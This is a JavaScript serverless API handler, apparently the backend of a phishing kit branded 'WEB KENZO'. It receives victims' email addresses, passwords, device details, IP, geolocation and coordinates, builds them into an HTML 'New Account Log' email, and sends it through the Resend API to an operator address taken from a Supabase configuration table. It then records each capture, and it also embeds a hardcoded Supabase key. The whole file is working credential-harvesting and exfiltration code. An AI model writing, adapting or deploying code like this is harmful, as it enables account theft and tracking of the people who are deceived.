export const config = { api: { bodyParser: true } };

function countryFlag(code){
    if (!code || code.length !== 2) return "";
    const codePoints = code.toUpperCase().split("").map(function(c){ return 127397 + c.charCodeAt(0); });
    return String.fromCodePoint.apply(null, codePoints);
}

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(200).end();
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    const API_KEY = process.env.RESEND_API_KEY;
    if (!API_KEY) return res.status(500).json({ error: "API_KEY_MISSING" });

    try {
        let d = req.body;
        if (typeof d === "string") d = JSON.parse(d);
        if (!d) return res.status(400).json({ error: "BODY_EMPTY" });

        const WEB_ID = d.web_id || "web_default"; 
        const PLATFORM = d.platform || "Unknown";

        const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
        
        let EMAIL_TUJUAN = "admin@domain.com"; 
        let NAMA_PENGIRIM = "WEB KENZO"; // Default
        let EMAIL_PENGIRIM = "hasilress@mediafire.my.id"; // Default

        try {
            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
                headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
            });
            const cfgData = await rCfg.json();
            if (cfgData && cfgData[0]) {
                if (cfgData[0].email_tujuan) EMAIL_TUJUAN = cfgData[0].email_tujuan;
                
                // PENGAMAN FORMAT NAMA_RESS
                if (cfgData[0].nama_ress) {
                    let rawNama = cfgData[0].nama_ress.trim();
                    
                    // Kalo isinya cuma "WEB KENZO" (ga ada email di dalem <...>), pake default email
                    if (!rawNama.includes('<')) {
                        NAMA_PENGIRIM = rawNama;
                    } else {
                        let parts = rawNama.split('<');
                        NAMA_PENGIRIM = parts[0].trim();
                        if (parts[1]) {
                            let cleanedEmail = parts[1].replace('>', '').trim();
                            if (cleanedEmail !== "") {
                                EMAIL_PENGIRIM = cleanedEmail;
                            }
                        }
                    }
                }
            }
        } catch(e) { console.log("Gagal ambil config:", e); }

        // Cek Darurat: Kalo nama kosong, set default
        if (!NAMA_PENGIRIM || NAMA_PENGIRIM === "") NAMA_PENGIRIM = "WEB KENZO";
        if (!EMAIL_PENGIRIM || EMAIL_PENGIRIM === "") EMAIL_PENGIRIM = "hasilress@mediafire.my.id";

        const flag = countryFlag(d.negaraKode || "");
        const previewText = "HATI HATI DENGAN WEB YANG MENGATAS NAMAKAN KENZ | IP " + (d.ip || "-");

        const htmlBody = `
        <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f6f8; padding: 40px 15px;">
          <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.025);">
            
            <div style="background-color: #ffffff; padding: 30px 30px 20px 30px; border-bottom: 1px solid #f1f5f9; text-align: left;">
              <h1 style="margin: 0; font-size: 22px; font-weight: 700; color: #1e293b; letter-spacing: -0.5px;">${NAMA_PENGIRIM}</h1>
              <p style="margin: 6px 0 0 0; font-size: 13px; color: #64748b; font-weight: 500;">New Account Log</p>
            </div>
            
            <div style="padding: 30px;">
              <div style="margin-bottom: 35px;">
                <h3 style="color: #64748b; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 15px 0; padding-bottom: 10px; border-bottom: 2px solid #f1f5f9;">Account Info</h3>
                <table style="width: 100%; border-collapse: collapse;">
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500; width: 35%;">Email</td>
                    <td style="padding: 12px 0; font-size: 15px; color: #0f172a; font-weight: 600;">${d.email || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Password</td>
                    <td style="padding: 12px 0; font-size: 15px; color: #e11d48; font-weight: 700;">${d.password || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Platform</td>
                    <td style="padding: 12px 0; font-size: 14px;">
                      <span style="background-color: #e0e7ff; color: #3730a3; padding: 5px 10px; border-radius: 6px; font-weight: 700; font-size: 12px;">${PLATFORM}</span>
                    </td>
                  </tr>
                </table>
              </div>

              <div style="margin-bottom: 35px;">
                <h3 style="color: #64748b; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 15px 0; padding-bottom: 10px; border-bottom: 2px solid #f1f5f9;">Device Info</h3>
                <table style="width: 100%; border-collapse: collapse;">
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500; width: 35%;">Device</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.device || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">OS Version</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.os || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Browser</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.browser || "-"}</td>
                  </tr>
                </table>
              </div>

              <div>
                <h3 style="color: #64748b; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 15px 0; padding-bottom: 10px; border-bottom: 2px solid #f1f5f9;">Location Info</h3>
                <table style="width: 100%; border-collapse: collapse;">
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500; width: 35%;">IP Address</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600; font-family: monospace;">${d.ip || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Country</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${flag} ${d.negara || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Province</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.prov || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">City</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.kota || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">ISP</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.isp || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Coordinates</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.koord || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Time</td>
                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.waktu || "-"}</td>
                  </tr>
                </table>
              </div>
            </div>

            <div style="background-color: #f8fafc; padding: 20px; text-align: center; border-top: 1px solid #f1f5f9;">
              <p style="margin: 0; font-size: 12px; color: #94a3b8;">Generated by ${NAMA_PENGIRIM} System &bull; ${new Date().getFullYear()}</p>
            </div>
          </div>
        </div>`;

        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
            body: JSON.stringify({
                from: `${NAMA_PENGIRIM} <${EMAIL_PENGIRIM}>`, // FORMAT AMAN
                to: [EMAIL_TUJUAN],
                subject: `WEB KENZO | ${PLATFORM} | IP ${d.ip || "-"}`, 
                html: htmlBody
            })
        });

        const data = await response.json();
        console.log("RESPONSE RESEND:", data);

        if (response.ok) {
            try {
                await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
                    method: "POST",
                    headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "application/json" },
                    body: JSON.stringify({ web_id: WEB_ID, created_at: new Date().toISOString() })
                });
            } catch(e) { console.log("Gagal nyatet log:", e); }
        }
        return res.status(response.status).json(data);
    } catch (error) {
        return res.status(500).json({ error: "CATCH_ERROR", message: error.message });
    }
}
